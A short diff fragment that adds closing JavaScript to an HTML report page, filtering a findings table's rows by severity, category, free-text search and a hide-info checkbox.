+const f=()=>{const s=sev.value,c=cat.value,t=q.value.toLowerCase(),h=hideinfo.checked;
+document.querySelectorAll("tr.f").forEach(r=>{r.style.display=((!s||r.dataset.sev==s)&&(!c||r.dataset.cat==c)&&(!t||r.textContent.toLowerCase().includes(t))&&!(h&&!s&&r.dataset.sev=="info"))?"":"none"})};
+[sev,cat,q,hideinfo].forEach(x=>x.addEventListener("input",f));f();
+</script></body></html>
